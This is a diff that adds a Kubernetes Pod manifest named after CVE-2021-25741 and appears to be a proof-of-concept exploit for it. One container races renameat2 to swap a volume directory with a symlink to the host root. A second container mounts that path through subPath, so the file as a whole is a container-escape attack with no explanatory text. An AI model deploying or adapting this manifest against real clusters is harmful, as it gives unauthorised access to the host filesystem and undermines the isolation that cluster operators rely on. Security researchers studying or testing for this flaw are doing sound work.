@@ -1,0 +1,24 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cve202125741
+spec:
+  containers:
+  - name: prep-symlink
+    image: exp
+    imagePullPolicy: Never
+    command: ["/bin/sh", "-ec", "mkdir /mnt/data/symlink-door; ln -s / /mnt/data/qweqwe;while true; do renameat2 -e /mnt/data/symlink-door /mnt/data/qweqwe; done"]
+    volumeMounts:
+    - name: my-volume
+      mountPath: /mnt/data
+  - name: mount-container
+    image: exp
+    imagePullPolicy: Never
+    command: ["/bin/sh", "-ec", "ls /mnt/data; sleep 999999"]
+    volumeMounts:
+    - mountPath: /mnt/data
+      name: my-volume
+      subPath: symlink-door
+  volumes:
+  - name: my-volume
+    emptyDir: {} 
